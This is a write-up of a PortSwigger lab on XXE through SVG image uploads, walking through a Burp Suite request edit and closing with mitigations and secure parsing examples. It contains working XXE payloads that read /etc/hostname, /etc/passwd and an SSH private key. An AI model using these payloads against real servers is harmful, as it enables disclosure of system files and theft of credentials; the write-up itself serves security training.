# Exploiting XXE via Image File Upload (PortSwigger Lab)

## Exploiting XXE via Image File Upload

### **Lab URL**

[PortSwigger Lab: Exploiting XXE via Image File Upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

***

### **Objective**

The goal of this lab is to exploit an **XML External Entity (XXE) vulnerability** through an image file upload function to retrieve sensitive data from the server. The vulnerability exists due to improper handling of **SVG files**, which are XML-based, and their processing by the **Apache Batik library**.

***

### **Understanding the Vulnerability**

* The application accepts **image uploads** but does not properly restrict XML processing in **SVG files**.
* External entities within an **SVG file** can reference **local files**, allowing **data exfiltration**.
* The **Apache Batik library**, used for SVG rendering, processes XML entities, making it vulnerable to **XXE attacks**.

***

### **Step-by-Step Solution**

#### **Step 1: Generate Traffic and Identify File Upload Functionality**

1. Navigate to the lab and locate the **comment submission form**.
2. Submit a test comment with a **valid image file** (e.g., `.png` or `.jpg`).
3. Use **Burp Suite** to intercept the request and analyze the file upload process.

***

#### **Step 2: Modify the Request to Inject an XXE Payload**

1. Capture the **file upload request** in Burp Suite.
2. Modify the request to **change the file extension** to `.svg`.
3. Set the **Content-Type header** to `image/svg+xml`.
4. Replace the image data with the following **XXE payload**:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

5. Send the modified request.
6. Check the **comments section** and inspect the **uploaded image**.
7. Extract the displayed **server hostname** from the SVG rendering.
8. Submit the extracted **hostname** to complete the lab.

***

### **Alternative Payloads for Additional Testing**

#### **1. Testing for File Disclosure Beyond Hostname**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>
    <text>&xxe;</text>
</svg>
```

#### **2. Testing for SSH Key Disclosure**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]>
<svg>
    <text>&xxe;</text>
</svg>
```

***

### **Why This is an Example of an XXE Attack**

#### **Characteristics of the Vulnerability**

1. **Insecure XML Parsing:** The application accepts **SVG files**, which are processed as XML.
2. **External Entity Injection:** The XML structure allows references to local files using `SYSTEM` entities.
3. **Sensitive Data Disclosure:** The response displays **server information**, demonstrating **data exfiltration**.

***

### **Mitigation Strategies**

#### &#x20;**Best Practices for Preventing XXE**

| **Mitigation Approach**             | **Secure?** | **Explanation**                                         |
| ----------------------------------- | ----------- | ------------------------------------------------------- |
| **Disable External Entities**       | ✅           | Prevents XML parsers from processing external entities. |
| **Use Secure XML Parsers**          | ✅           | Ensures entity expansion is disabled by default.        |
| **Sanitize File Uploads**           | ✅           | Restricts file types to non-XML-based formats.          |
| **Verify Content-Type Server-Side** | ✅           | Prevents attackers from spoofing image uploads.         |

#### **Example of Secure XML Parsing (Python)**

```python
import defusedxml.ElementTree as ET
ET.parse('data.xml')  # Secure parsing without external entities
```

#### **Example of Secure XML Parsing (Java)**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

***

### **Conclusion**

This lab demonstrates how **XXE vulnerabilities in file uploads** can be exploited to retrieve **sensitive system information**. To mitigate these risks, **external entity processing must be disabled**, **SVG uploads should be restricted**, and **file validation must be enforced** to prevent unauthorized XML parsing.
